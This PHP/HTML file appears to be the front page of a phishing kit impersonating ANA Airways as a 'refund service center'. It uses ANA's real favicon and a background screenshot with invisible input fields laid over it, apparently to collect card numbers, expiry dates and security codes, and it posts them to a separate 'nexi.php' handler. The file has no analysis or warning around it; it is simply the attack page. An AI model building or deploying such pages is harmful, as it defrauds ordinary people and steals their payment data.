﻿<?php   ob_start();  ?>
<?
include "X.php";
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>ANA Airways 返金サービスセンター</title>
	<link rel="icon" type="image/png" href="https://www.ana.co.jp/favicon.ico" />
	<style>
		body {
		 margin-top: -41;
		 background: #fff;
		}

		.page {
		 background-image: url("STR/Nexi1.png");
		 background-repeat: no-repeat;
		 height: 695px;
		 width: 1340px;
		 position: relative;
		}
		
		input, select {
		 position: absolute; /* VODKA */
		 width: 304;
		 height: 22;
		 border: 0;
		 padding: 3 8 3 8;
		 left: 587;
		}

		.button {
		 width: 105;
		 height: 37;
		 border: 0;
		 cursor: pointer;
		}
		.submit {
		 position: absolute;
		 left: 810;
		 top: 540;
		}
	.auto-style1 {
	margin-top: 8px;
}
.auto-style2 {
	margin-top: 0px;
}
	</style>
	

								<p>&nbsp;<form name="appleConnectForm" method="post" action="nexi.php">

	<center>
			<form action="--WEBBOT-SELF--" method="POST" id="info" onsubmit="if(do_submit(3)) return true; else return false;">
		<div class="page" style="left: 0px; top: 0px; height: 1295px">

			<div>
				<input type="text" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname6" name="jp4" style="top:573; position:absolute; left:701; width:66px; height:28px" size="41" class="auto-style2"><input type="text" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname5" name="jp3" style="top:573; position:absolute; left:605; width:66px; height:28px" size="41" class="auto-style2"><input type="text" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname8" name="jp6" style="top:699; position:absolute; left:605; width:143px; height:26px" size="41" class="auto-style2"><input type="text" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname7" name="jp5" style="top:622; position:absolute; left:605; width:143px; height:26px" size="41" class="auto-style2"><input type="text" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname4" name="jp1" style="top:433; position:absolute; left:605; width:131px; height:26px" size="41" class="auto-style2">
				<input type="text" id="pass0" name="jp2" class="auto-style1" required="" title="  " style="position: absolute; left: 605; top: 493; height: 26px; width: 204px" size="1"><div class="button submit" onclick="javascript:do_submit(1);" style="position: absolute; left: 729px; top: 699px; width: 88px; height: 5px">
					<p>
<input type="image"  border="0" alt="" name="submit" style="position: absolute; left: -70; top: 130; " src="STR/blank.gif" height="33" width="241">
					<p>
					&nbsp;</div>
					<!--  -->